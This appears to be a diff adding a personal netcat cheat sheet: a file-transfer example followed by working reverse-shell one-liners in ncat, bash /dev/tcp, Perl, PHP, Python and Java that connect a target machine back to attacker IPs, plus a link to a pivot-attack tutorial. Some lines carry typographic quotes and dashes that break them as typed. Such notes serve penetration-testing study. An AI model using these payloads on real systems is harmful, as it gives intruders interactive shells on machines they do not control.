@@ -1,0 +1,68 @@
+
+sudo apt-get update -y
+sudo apt-get install -y ncat
+//sudo apt-get install -y netcat
+
+
+
+---file upload example---------------
+machine1>nc -lvp 8080 > transfer.txt
+
+
+machine2>echo hello >abc
+machine2>nc <machine1 ip> 8080 < abc
+
+machine1>cat transfer.txt
+hello
+
+===================================
+reverse shell:
+
+attacker machine> ncat –lvp 4444
+
+target machine>ncat 192.168.100.113 4444 –e /bin/bash  &
+
+attacker machine>ls      //get list on target machine
+
+to close the connection from targrt machine we have to kill the process running natcat
+
+target machine>ps
+target machine>kill <pid of ncat>
+
+========================================
+reverse shell without ncat on target machine:
+attacker machine> ncat –lvp 4444
+target machine>   bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
+attacker machine>ls      //get list on target machine
+
+
+similarly we can create reverse shell from target machine in many other ways:
+1)pearl
+target machine>perl -e ‘use Socket;$i=”192.168.100.113″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’
+
+
+2)PHP
+
+target machine>  php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+
+3)python
+target machine> python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+
+
+4)bash(this method is better as it also runs on background)
+
+target machine> exec 5<>/dev/tcp/192.168.1.142/80
+target machine> cat <&5 | while read line; do $line 2>&5 >&5; done  &
+# or:
+target machine> while read line 0<&5; do $line 2>&5 >&5; done   &
+
+
+5Java
+
+r = Runtime.getRuntime()
+p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
+p.waitFor()
+
+==========================================
+pivot attack:
+https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/
